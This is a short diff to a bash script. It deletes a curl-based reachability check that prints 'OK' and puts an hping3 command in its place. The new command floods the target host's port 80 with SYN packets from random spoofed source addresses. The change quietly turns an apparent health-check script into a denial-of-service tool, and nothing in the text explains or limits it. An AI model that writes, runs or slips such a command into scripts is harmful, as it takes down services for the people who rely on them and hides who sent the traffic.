@@ -1,2 +1,2 @@
 #!/bin/bash
-curl -s http://$1 > /dev/null && echo "OK"
+hping3 -c 4 -d 1460 -S -p 80 --rand-source --flood "$1"
